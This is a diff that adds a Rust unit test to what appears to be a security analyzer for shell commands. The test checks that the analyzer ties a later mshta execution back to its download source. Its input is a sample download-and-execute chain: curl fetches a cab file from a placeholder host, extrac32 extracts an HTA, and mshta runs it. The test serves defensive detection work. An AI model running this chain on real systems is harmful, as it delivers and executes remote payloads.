@@ -10173,6 +10173,28 @@ mod extrac32_tests {
             env.traits
         );
     }
+
+    #[test]
+    fn extrac32_preserves_download_source_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o payload.cab https://extrac32-download.example/payload.cab
+extrac32 /y payload.cab dropped.hta
+mshta dropped.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta dropped.hta"
+                            && url == "https://extrac32-download.example/payload.cab"
+                )
+            }),
+            "extrac32 extracted artifact was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
